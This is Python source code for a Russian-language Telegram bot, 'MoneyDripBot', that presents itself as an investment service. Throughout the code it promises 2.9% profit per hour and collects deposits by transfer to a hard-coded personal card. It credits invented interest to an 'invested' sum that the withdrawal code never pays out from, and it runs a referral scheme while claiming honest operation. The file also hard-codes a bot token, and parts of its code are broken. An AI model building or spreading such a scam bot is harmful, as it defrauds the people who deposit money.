import asyncio
import logging
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
import aiosqlite
import re

# ========== НАСТРОЙКИ ==========
TOKEN = "8587086312:AAE9jbbaPZBzU-niDmOK7uhHhpCYSvf_BoU"
ADMIN_ID = 7603296347
SUPPORT_USERNAME = "WWWMMMZZZwq"
CARD_NUMBER = "2200 7012 3329 6489"
CARD_HOLDER = "Дмитрий А."
REFERRAL_BONUS = 0.05
# ================================

bot = Bot(token=TOKEN)
dp = Dispatcher()

# === ПАРСИНГ ЧИСЕЛ (100k = 100000) ===
def parse_amount(text: str) -> float:
    text = text.lower().replace(" ", "").replace(",", ".")
    if "k" in text:
        return float(text.replace("k", "")) * 1000
    elif "m" in text:
        return float(text.replace("m", "")) * 1000000
    else:
        return float(text)

# === БАЗА ДАННЫХ ===
async def init_db():
    async with aiosqlite.connect("users.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                balance REAL DEFAULT 0,
                invest_sum REAL DEFAULT 0,
                last_percent TEXT,
                deposit_request REAL DEFAULT 0,
                withdraw_request REAL DEFAULT 0,
                card_number TEXT DEFAULT '',
                referrer_id INTEGER DEFAULT 0,
                referral_earnings REAL DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                type TEXT,
                amount REAL,
                status TEXT,
                details TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.commit()

# === ДОБАВЛЕНИЕ В ИСТОРИЮ ===
async def add_history(user_id: int, type: str, amount: float, status: str = "completed", details: str = ""):
    async with aiosqlite.connect("users.db") as db:
        await db.execute(
            "INSERT INTO history (user_id, type, amount, status, details) VALUES (?, ?, ?, ?, ?)",
            (user_id, type, amount, status, details)
        )
        await db.commit()

# === СТАРТ ===
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    async with aiosqlite.connect("users.db") as db:
        user = await db.execute_fetchone("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
        is_new = user is None
        await db.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        
        if len(args) > 1 and args[1].startswith("ref"):
            referrer_id = int(args[1].replace("ref", ""))
            if referrer_id != user_id and is_new:
                await db.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user_id))
                await add_history(user_id, "Регистрация", 0, "completed", f"Реферер: {referrer_id}")
        await db.commit()
    
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Умножить деньги", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 Проценты", callback_data="percent_info")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
         InlineKeyboardButton(text="📊 История", callback_data="history")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    
    await message.answer(
        f"🚀 *Добро пожаловать в MoneyDripBot!*\n\n"
        f"💰 Здесь твои деньги работают 24/7\n"
        f"📈 Каждый час +2,9% к сумме в работе\n"
        f"💳 Пополнение и вывод на карту\n\n"
        f"🎁 *Твоя реферальная ссылка:*\n"
        f"`{ref_link}`\n\n"
        f"🔥 Приводи друзей и получай 5% с их пополнений!\n\n"
        f"👇 Выбери действие:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === БАЛАНС ===
@dp.callback_query(lambda c: c.data == "balance")
async def show_balance(call: CallbackQuery):
    user_id = call.from_user.id
    async with aiosqlite.connect("users.db") as db:
        row = await db.execute_fetchone(
            "SELECT balance, invest_sum, referral_earnings FROM users WHERE user_id = ?",
            (user_id,)
        )
        balance = row[0] if row else 0
        invest = row[1] if row else 0
        ref_earnings = row[2] if row else 0
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"💳 *ТВОЙ БАЛАНС*\n\n"
        f"💰 Доступно: `{balance:,.0f}₽`\n"
        f"📈 В работе: `{invest:,.0f}₽`\n"
        f"🎁 Реферальный бонус: `{ref_earnings:,.0f}₽`\n\n"
        f"⏳ Каждый час +2,9% к сумме в работе 🔥",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === РЕФЕРАЛЫ ===
@dp.callback_query(lambda c: c.data == "referrals")
async def show_referrals(call: CallbackQuery):
    user_id = call.from_user.id
    
    async with aiosqlite.connect("users.db") as db:
        ref_count_row = await db.execute_fetchone(
            "SELECT COUNT(*) FROM users WHERE referrer_id = ?",
            (user_id,)
        )
        ref_count = ref_count_row[0] if ref_count_row else 0
        
        earnings_row = await db.execute_fetchone(
            "SELECT referral_earnings FROM users WHERE user_id = ?",
            (user_id,)
        )
        ref_earnings = earnings_row[0] if earnings_row else 0
    
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Копировать ссылку", callback_data="copy_ref")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"👥 *РЕФЕРАЛЬНАЯ СИСТЕМА*\n\n"
        f"🎁 *Твоя ссылка:*\n"
        f"`{ref_link}`\n\n"
        f"📊 *Статистика:*\n"
        f"• Приглашено: `{ref_count}` чел.\n"
        f"• Заработано: `{ref_earnings:,.0f}₽`\n\n"
        f"💰 *Бонус:* 5% с каждого пополнения реферала\n\n"
        f"👉 Отправь ссылку друзьям и зарабатывай!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ИСТОРИЯ ===
@dp.callback_query(lambda c: c.data == "history")
async def show_history(call: CallbackQuery):
    user_id = call.from_user.id
    
    async with aiosqlite.connect("users.db") as db:
        history_rows = await db.execute_fetchall(
            "SELECT type, amount, status, created_at FROM history WHERE user_id = ? ORDER BY created_at DESC LIMIT 10",
            (user_id,)
        )
    
    if not history_rows:
        text = "📊 *ИСТОРИЯ ОПЕРАЦИЙ*\n\nУ тебя пока нет операций."
    else:
        text = "📊 *ИСТОРИЯ ОПЕРАЦИЙ (последние 10)*\n\n"
        for op in history_rows:
            type_map = {
                "deposit": "📥 Пополнение",
                "withdraw": "📤 Вывод",
                "invest": "💰 Умножение",
                "percent": "📈 Проценты",
                "referral": "🎁 Реферальный бонус"
            }
            op_type = type_map.get(op[0], op[0])
            amount = f"{op[1]:,.0f}₽"
            date = datetime.fromisoformat(op[3]).strftime("%d.%m.%Y %H:%M")
            text += f"{op_type}: `{amount}`\n📅 {date}\n\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(text, parse_mode="Markdown", reply_markup=keyboard)

# === ПОПОЛНЕНИЕ ===
@dp.callback_query(lambda c: c.data == "deposit")
async def deposit_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="i_paid")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"📥 *ПОПОЛНЕНИЕ БАЛАНСА*\n\n"
        f"💳 *Карта для перевода:*\n"
        f"`{CARD_NUMBER}`\n"
        f"👤 *Получатель:* {CARD_HOLDER}\n\n"
        f"💰 *Минимальная сумма:* 100₽\n"
        f"🚀 *Максимум:* безлимит\n\n"
        f"📌 *Как пополнить:*\n"
        f"1️⃣ Переведи любую сумму на карту\n"
        f"2️⃣ Нажми кнопку *«✅ Я оплатил»*\n"
        f"3️⃣ Введи сумму перевода\n\n"
        f"✅ Примеры: `500`, `1.5k`, `2K`\n"
        f"👉 `1k = 1000₽`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === Я ОПЛАТИЛ ===
@dp.callback_query(lambda c: c.data == "i_paid")
async def i_paid(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📝 *Введите сумму перевода:*\n\n"
        f"➡️ Например: `500`, `1.5k`, `2K`\n\n"
        f"⚠️ Сумма должна совпадать с переводом!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА ПОПОЛНЕНИЯ ===
@dp.message(lambda m: m.text and re.match(r'^[\d\.]+[km]?$', m.text.lower().replace(" ", "")))
async def process_deposit(message: Message):
    user_id = message.from_user.id
    
    try:
        amount = parse_amount(message.text)
    except:
        await message.answer("❌ Неверный формат. Примеры: 500, 1.5k, 2K")
        return
    
    if amount < 100:
        await message.answer("❌ Минимальная сумма пополнения — 100 ₽")
        return
    
    async with aiosqlite.connect("users.db") as db:
        await db.execute("UPDATE users SET deposit_request = ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
        await add_history(user_id, "deposit", amount, "pending", f"Заявка на пополнение")
    
    referrer_row = await db.execute_fetchone("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
    referrer_id = referrer_row[0] if referrer_row else 0
    
    await bot.send_message(
        ADMIN_ID,
        f"🔔 *НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ*\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{CARD_NUMBER}`\n"
        f"👥 Реферер: `{referrer_id if referrer_id else 'нет'}`\n\n"
        f"✅ *Подтвердить:* `/confirm {user_id}`",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка отправлена!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"⏳ Ожидай подтверждения (1-3 минуты)\n\n"
        f"❓ Вопросы: @{SUPPORT_USERNAME}",
        parse_mode="Markdown"
    )

# === ПОДТВЕРЖДЕНИЕ ПОПОЛНЕНИЯ ===
@dp.message(Command("confirm"))
async def confirm_deposit(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /confirm 123456789")
        return
    
    async with aiosqlite.connect("users.db") as db:
        row = await db.execute_fetchone(
            "SELECT deposit_request, referrer_id FROM users WHERE user_id = ?",
            (user_id,)
        )
        if not row or row[0] == 0:
            await message.answer("❌ Нет активных заявок")
            return
        
        amount = row[0]
        referrer_id = row[1]
        
        await db.execute(
            "UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?",
            (amount, user_id)
        )
        
        if referrer_id and referrer_id != 0:
            bonus = amount * REFERRAL_BONUS
            await db.execute(
                "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
                (bonus, bonus, referrer_id)
            )
            await add_history(referrer_id, "referral", bonus, "completed", f"Бонус за пополнение реферала {user_id}")
            
            try:
                await bot.send_message(
                    referrer_id,
                    f"🎁 *Реферальный бонус!*\n\n"
                    f"Ваш реферал пополнил баланс на `{amount:,.0f}₽`\n"
                    f"💰 Вам начислено `{bonus:,.0f}₽` (5%)\n\n"
                    f"✅ Спасибо, что с нами!",
                    parse_mode="Markdown"
                )
            except:
                pass
        
        await db.commit()
        await add_history(user_id, "deposit", amount, "completed", f"Пополнение подтверждено")
    
    await message.answer(f"✅ Баланс пользователя {user_id} пополнен на {amount:,.0f}₽")
    await bot.send_message(
        user_id,
        f"✅ *Баланс пополнен!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"🚀 Можешь запускать умножение!",
        parse_mode="Markdown"
    )

# === УМНОЖИТЬ ДЕНЬГИ ===
@dp.callback_query(lambda c: c.data == "multiply")
async def multiply_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "💰 *УМНОЖЕНИЕ ДЕНЕГ*\n\n"
        f"💸 Введи сумму для запуска в работу:\n"
        f"• Минимум: 100₽\n"
        f"• Каждый час +2,9%\n\n"
        f"✅ Примеры: `500`, `1.5k`, `2K`\n\n"
        f"⚠️ *Деньги спишутся с баланса мгновенно!*",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА УМНОЖЕНИЯ ===
@dp.message(lambda m: m.text and m.text.lower().startswith('*'))
async def process_multiply(message: Message):
    user_id = message.from_user.id
    text = message.text.replace('*', '').strip()
    
    try:
        amount = parse_amount(text)
    except:
        await message.answer("❌ Неверный формат. Используй: *500, *1.5k, *2K")
        return
    
    async with aiosqlite.connect("users.db") as db:
        balance_row = await db.execute_fetchone("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        balance = balance_row[0] if balance_row else 0
        
        if amount > balance:
            await message.answer(f"❌ Недостаточно средств. Баланс: `{balance:,.0f}₽`")
            return
        
        if amount < 100:
            await message.answer("❌ Минимальная сумма — 100 ₽")
            return
        
        await db.execute(
            "UPDATE users SET balance = balance - ?, invest_sum = invest_sum + ?, last_percent = ? WHERE user_id = ?",
            (amount, amount, datetime.now().isoformat(), user_id)
        )
        await db.commit()
        await add_history(user_id, "invest", amount, "completed", f"Запуск в работу")
    
    await message.answer(
        f"✅ *ГОТОВО!*\n\n"
        f"💸 `{amount:,.0f}₽` запущены в работу\n"
        f"📈 Каждый час +2,9%\n"
        f"💰 Баланс: `{balance - amount:,.0f}₽`\n"
        f"📊 В работе: `{amount:,.0f}₽`\n\n"
        f"⏳ Первые проценты через 60 минут",
        parse_mode="Markdown"
    )

# === ПРОЦЕНТЫ (КАЖДЫЙ ЧАС) ===
async def percent_worker():
    while True:
        await asyncio.sleep(3600)
        async with aiosqlite.connect("users.db") as db:
            users = await db.execute_fetchall(
                "SELECT user_id, invest_sum FROM users WHERE invest_sum > 0"
            )
            for user_id, invest in users:
                profit = invest * 0.029
                await db.execute(
                    "UPDATE users SET invest_sum = invest_sum + ? WHERE user_id = ?",
                    (profit, user_id)
                )
                await add_history(user_id, "percent", profit, "completed", f"Начисление процентов")
                try:
                    await bot.send_message(
                        user_id,
                        f"📈 *НАЧИСЛЕНИЕ ПРОЦЕНТОВ*\n\n"
                        f"➕ +`{profit:,.2f}₽`\n"
                        f"💰 В работе: `{invest + profit:,.2f}₽`\n\n"
                        f"⏳ Следующее начисление через 60 минут",
                        parse_mode="Markdown"
                    )
                except:
                    pass
            await db.commit()

# === ВЫВОД СРЕДСТВ ===
@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📤 *ВЫВОД СРЕДСТВ*\n\n"
        f"💰 Минимальная сумма: 100₽\n"
        f"💳 Вывод на карту\n\n"
        f"➡️ *Введи сумму и номер карты:*\n"
        f"Формат: `СУММА НОМЕР_КАРТЫ`\n\n"
        f"✅ Пример: `1000 2200123456789012`",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ОБРАБОТКА ВЫВОДА ===
@dp.message(lambda m: len(m.text.split()) == 2 and m.text.split()[0].replace('.', '').isdigit())
async def process_withdraw(message: Message):
    user_id = message.from_user.id
    parts = message.text.split()
    
    try:
        amount = float(parts[0])
        card_number = parts[1]
    except:
        await message.answer("❌ Неверный формат. Используй: `1000 2200123456789012`")
        return
    
    async with aiosqlite.connect("users.db") as db:
        balance_row = await db.execute_fetchone("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        balance = balance_row[0] if balance_row else 0
        
        if amount > balance:
            await message.answer(f"❌ Недостаточно средств. Баланс: `{balance:,.0f}₽`")
            return
        
        if amount < 100:
            await message.answer("❌ Минимальная сумма вывода — 100 ₽")
            return
        
        await db.execute(
            "UPDATE users SET withdraw_request = ?, card_number = ? WHERE user_id = ?",
            (amount, card_number, user_id)
        )
        await db.commit()
        await add_history(user_id, "withdraw", amount, "pending", f"Заявка на вывод, карта: {card_number[-4:]}")
    
    await bot.send_message(
        ADMIN_ID,
        f"🔔 *НОВАЯ ЗАЯВКА НА ВЫВОД*\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{card_number}`\n\n"
        f"✅ *Подтвердить:* `/withdraw {user_id}`",
        parse_mode="Markdown"
    )
    
    await message.answer(
        f"✅ *Заявка на вывод отправлена!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{card_number[-4:]}`\n"
        f"⏳ Ожидай подтверждения (1-3 минуты)",
        parse_mode="Markdown"
    )

# === ПОДТВЕРЖДЕНИЕ ВЫВОДА ===
@dp.message(Command("withdraw"))
async def confirm_withdraw(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /withdraw 123456789")
        return
    
    async with aiosqlite.connect("users.db") as db:
        row = await db.execute_fetchone(
            "SELECT withdraw_request, card_number FROM users WHERE user_id = ?",
            (user_id,)
        )
        if not row or row[0] == 0:
            await message.answer("❌ Нет активных заявок на вывод")
            return
        
        amount = row[0]
        card = row[1]
        
        await db.execute(
            "UPDATE users SET balance = balance - ?, withdraw_request = 0 WHERE user_id = ?",
            (amount, user_id)
        )
        await db.commit()
        await add_history(user_id, "withdraw", amount, "completed", f"Вывод подтвержден, карта: {card[-4:]}")
    
    await message.answer(f"✅ Вывод {amount:,.0f}₽ пользователю {user_id} подтверждён")
    await bot.send_message(
        user_id,
        f"✅ *Вывод подтверждён!*\n\n"
        f"💰 Сумма: `{amount:,.0f}₽`\n"
        f"💳 Карта: `{card[-4:]}`\n\n"
        f"⏳ Деньги поступят в течение 1-3 минут",
        parse_mode="Markdown"
    )

# === ПРОЦЕНТЫ ИНФО (ИСПРАВЛЕНО) ===
@dp.callback_query(lambda c: c.data == "percent_info")
async def percent_info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "📈 *КАК РАБОТАЮТ ПРОЦЕНТЫ*\n\n"
        "1️⃣ Пополни баланс через карту\n"
        "2️⃣ Запусти деньги в работу (*1000)\n"
        "3️⃣ Каждый час +2,9%\n\n"
        "✨ *Пример:*\n"
        "1000₽ → 1029₽ (час)\n"
        "→ ~2000₽ (день)",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ПОДДЕРЖКА ===
@dp.callback_query(lambda c: c.data == "support")
async def support(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME}")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        f"🛡 *ПОДДЕРЖКА*\n\n"
        f"📩 Логин: @{SUPPORT_USERNAME}\n"
        f"⏱ Время ответа: 5–15 минут\n\n"
        f"💬 Пиши по любым вопросам!",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ИНФО ===
@dp.callback_query(lambda c: c.data == "info")
async def info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    
    await call.message.edit_text(
        "ℹ️ *ИНФОРМАЦИЯ*\n\n"
        f"💰 *Проценты:* 2,9% в час\n"
        f"📉 *Мин. старт:* 100₽\n"
        f"📤 *Мин. вывод:* 100₽\n"
        f"🎁 *Реферальный бонус:* 5%\n"
        f"💳 *Карта:* Сбербанк\n\n"
        f"📌 *Форматы ввода:*\n"
        f"• `500` — 500₽\n"
        f"• `1.5k` — 1500₽\n"
        f"• `2K` — 2000₽\n"
        f"• `*500` — умножение\n\n"
        f"✅ Работаем честно с 2024 года",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === КОПИРОВАТЬ РЕФЕРАЛЬНУЮ ССЫЛКУ ===
@dp.callback_query(lambda c: c.data == "copy_ref")
async def copy_ref(call: CallbackQuery):
    await call.answer("Ссылка скопирована! 📋", show_alert=False)

# === ДОБАВИТЬ БАЛАНС (АДМИН) ===
@dp.message(Command("add"))
async def add_balance(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        amount = float(parts[2])
    except:
        await message.answer("Используй: /add 123456789 1000")
        return
    
    async with aiosqlite.connect("users.db") as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
        await add_history(user_id, "admin", amount, "completed", f"Начислено администратором")
    
    await message.answer(f"✅ Баланс пользователя {user_id} увеличен на {amount:,.0f}₽")
    await bot.send_message(
        user_id,
        f"💰 *Вам начислено {amount:,.0f}₽!*",
        parse_mode="Markdown"
    )

# === СТАТИСТИКА (АДМИН) ===
@dp.message(Command("stats"))
async def stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect("users.db") as db:
        total_users_row = await db.execute_fetchone("SELECT COUNT(*) FROM users")
        total_users = total_users_row[0] if total_users_row else 0
        
        new_users_row = await db.execute_fetchone(
            "SELECT COUNT(*) FROM users WHERE DATE(created_at) = DATE('now')"
        )
        new_users_today = new_users_row[0] if new_users_row else 0
        
        total_balance_row = await db.execute_fetchone("SELECT SUM(balance) FROM users")
        total_balance = total_balance_row[0] or 0
        
        total_invest_row = await db.execute_fetchone("SELECT SUM(invest_sum) FROM users")
        total_invest = total_invest_row[0] or 0
        
        deposits_row = await db.execute_fetchone(
            "SELECT SUM(amount) FROM history WHERE type = 'deposit' AND status = 'completed' AND DATE(created_at) = DATE('now')"
        )
        deposits_today = deposits_row[0] or 0
        
        withdraws_row = await db.execute_fetchone(
            "SELECT SUM(amount) FROM history WHERE type = 'withdraw' AND status = 'completed' AND DATE(created_at) = DATE('now')"
        )
        withdraws_today = withdraws_row[0] or 0
        
        pending_row = await db.execute_fetchone("SELECT COUNT(*) FROM history WHERE status = 'pending'")
        pending_requests = pending_row[0] or 0
    
    await message.answer(
        f"📊 *СТАТИСТИКА БОТА*\n\n"
        f"👥 *Пользователи:*\n"
        f"• Всего: `{total_users}`\n"
        f"• Новых сегодня: `{new_users_today}`\n\n"
        f"💰 *Финансы:*\n"
        f"• Общий баланс: `{total_balance:,.0f}₽`\n"
        f"• В работе: `{total_invest:,.0f}₽`\n"
        f"• Пополнений сегодня: `{deposits_today:,.0f}₽`\n"
        f"• Выводов сегодня: `{withdraws_today:,.0f}₽`\n\n"
        f"⏳ *Заявки:*\n"
        f"• В обработке: `{pending_requests}`\n\n"
        f"📈 *Проценты:* 2,9% в час\n"
        f"🎁 *Реферальный бонус:* 5%\n"
        f"💳 *Карта:* `{CARD_NUMBER[-4:]}`",
        parse_mode="Markdown"
    )

# === УЗНАТЬ СВОЙ ID ===
@dp.message(Command("id"))
async def get_id(message: Message):
    await message.answer(f"🆔 *Твой Telegram ID:* `{message.from_user.id}`", parse_mode="Markdown")

# === НАЗАД В МЕНЮ ===
@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu(call: CallbackQuery):
    user_id = call.from_user.id
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Умножить деньги", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 Проценты", callback_data="percent_info")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
         InlineKeyboardButton(text="📊 История", callback_data="history")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    
    await call.message.edit_text(
        f"🚀 *Главное меню*\n\n"
        f"👇 Выбери действие:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# === ЗАПУСК ===
async def main():
    logging.basicConfig(level=logging.INFO)
    await init_db()
    asyncio.create_task(percent_worker())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
